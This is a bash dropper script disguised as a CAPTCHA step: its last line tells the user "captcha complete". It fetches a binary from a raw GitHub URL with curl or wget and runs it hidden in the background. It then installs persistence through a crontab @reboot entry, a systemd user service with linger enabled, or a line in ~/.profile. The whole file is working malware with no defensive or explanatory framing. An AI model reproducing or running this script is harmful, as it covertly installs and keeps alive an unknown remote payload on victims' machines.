#!/bin/bash
set -e

APP_NAME="n2client"                      
BINARY_URL="https://raw.githubusercontent.com/hellow2003/phpcode/main/client"   

if [ "$EUID" -eq 0 ]; then
    INSTALL_DIR="/usr/local/bin"
else
    INSTALL_DIR="$HOME/.${APP_NAME}"
fi

mkdir -p "$INSTALL_DIR"
BIN_PATH="$INSTALL_DIR/$APP_NAME"

echo "[*] Downloading binary..."
if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$BINARY_URL" -o "$BIN_PATH"
elif command -v wget >/dev/null 2>&1; then
    wget -q "$BINARY_URL" -O "$BIN_PATH"
else
    echo "Error: Neither curl nor wget found. Install one and retry." >&2
    exit 1
fi

chmod +x "$BIN_PATH"

nohup "$BIN_PATH" >/dev/null 2>&1 &
disown

register_persistence() {
    local cron_entry="@reboot sleep 10 && $BIN_PATH >/dev/null 2>&1"

    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$BIN_PATH"; echo "$cron_entry") | crontab -
        echo "[+] Persistence: crontab @reboot added."
        return
    fi

    if command -v systemctl >/dev/null 2>&1 && systemctl --user >/dev/null 2>&1; then
        local SERVICE_DIR="$HOME/.config/systemd/user"
        mkdir -p "$SERVICE_DIR"
        local SERVICE_FILE="$SERVICE_DIR/${APP_NAME}.service"
        cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=$APP_NAME service
After=network.target

[Service]
Type=simple
ExecStart=$BIN_PATH
Restart=on-failure
RestartSec=5

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable "$APP_NAME.service"
        systemctl --user start "$APP_NAME.service"

        command -v loginctl >/dev/null 2>&1 && loginctl enable-linger 2>/dev/null || true
        echo "[+] Persistence: systemd user service created and enabled."
        return
    fi

    if [ -f "$HOME/.profile" ]; then
        if ! grep -qF "$BIN_PATH" "$HOME/.profile"; then
            echo "nohup $BIN_PATH >/dev/null 2>&1 &" >> "$HOME/.profile"
            echo "[!] Persistence added to ~/.profile (works on login, not boot)."
        fi
        return
    fi

    echo "[!] No suitable persistence method found. The binary will not survive a reboot." >&2
}

register_persistence

echo "[✓] captcha complete. '$APP_NAME' is now running and will persist after reboot."
